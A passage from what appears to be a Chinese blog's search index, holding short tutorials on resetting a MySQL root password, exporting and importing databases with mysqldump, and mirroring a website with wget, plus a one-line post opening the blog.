password=PASSWORD(&apos;newpassword&apos;) where User=&apos;root&apos;; </span><br><span class="line">###</span><br><span class="line">mysql5.7中</span><br><span class="line">update mysql.user set authentication_string=PASSWORD(&apos;qq123456&apos;) where User=&apos;root&apos;;</span><br><span class="line">###</span><br><span class="line">mysql&gt; flush privileges; </span><br><span class="line">mysql&gt; quit </span><br><span class="line">重新启动MySQL</span><br><span class="line">/etc/init.d/mysql restart</span><br><span class="line">就可以使用新密码 newpassword 登录了。</span><br></pre></td></tr></table></figure><h2 id="导出数据库"><a href="#导出数据库" class="headerlink" title="导出数据库"></a>导出数据库</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">直接使用命令：</span><br><span class="line">mysqldump -u root -p abc &gt;abc.sql</span><br><span class="line">然后回车输入密码就可以了；</span><br><span class="line">mysqldump -u 数据库链接用户名 -p  目标数据库 &gt; 存储的文件名</span><br></pre></td></tr></table></figure><h2 id="导入数据库（sql文件）"><a href="#导入数据库（sql文件）" class="headerlink" title="导入数据库（sql文件）"></a>导入数据库（sql文件）</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">mysql -u 用户名 -p  数据库名 &lt; 数据库名.sql</span><br><span class="line">mysql -u abc -p abc &lt; abc.sql</span><br><span class="line">注意sql文件必须在当前目录下，如果不在当前目录下需要在&lt; 之后加上具体sql文件路径</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> 教程 </category>
          
      </categories>
      
      
    </entry>
    
    <entry>
      <title>wget进行整站下载</title>
      <link href="//blog/2017/wget%E8%BF%9B%E8%A1%8C%E6%95%B4%E7%AB%99%E4%B8%8B%E8%BD%BD.html"/>
      <url>//blog/2017/wget%E8%BF%9B%E8%A1%8C%E6%95%B4%E7%AB%99%E4%B8%8B%E8%BD%BD.html</url>
      
        <content type="html"><![CDATA[<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">wget -r -p -np -k http://xxx.com/abc/</span><br></pre></td></tr></table></figure><p>-r,  –recursive（递归）          specify recursive download.（指定递归下载）<br>-k,  –convert-links（转换链接）      make links in downloaded HTML point to local files.（将下载的HTML页面中的链接转换为相对链接即本地链接）<br>-p,  –page-requisites（页面必需元素）    get all images, etc. needed to display HTML page.（下载所有的图片等页面显示所需的内容）<br>-np, –no-parent（不追溯至父级）          don’t ascend to the parent directory.<br>另外断点续传用-nc参数 日志 用-o参数</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">wget -p -k -E -H https://xxx.com/abc/</span><br></pre></td></tr></table></figure><p>-p 参数不能下载外链的图片，如果需要下载外域的图片，加上-H</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">wget -p -k -E -H -i filelist.txt</span><br></pre></td></tr></table></figure><p>-i 从文件中读取要下载的url。</p>]]></content>
      
      
      <categories>
          
          <category> 教程 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> wget </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>博客初开</title>
      <link href="//blog/2016/%E5%8D%9A%E5%AE%A2%E5%88%9D%E5%BC%80.html"/>
      <url>//blog/2016/%E5%8D%9A%E5%AE%A2%E5%88%9D%E5%BC%80.html</url>
      
        <content type="html"><![CDATA[<p>开始拯救健忘的我！！！</p>]]></content>
      
      
      <categories>
          
          <category> 杂记 </category>
          
      </categories>
      
      
    </entry>
    
  
  
</search>
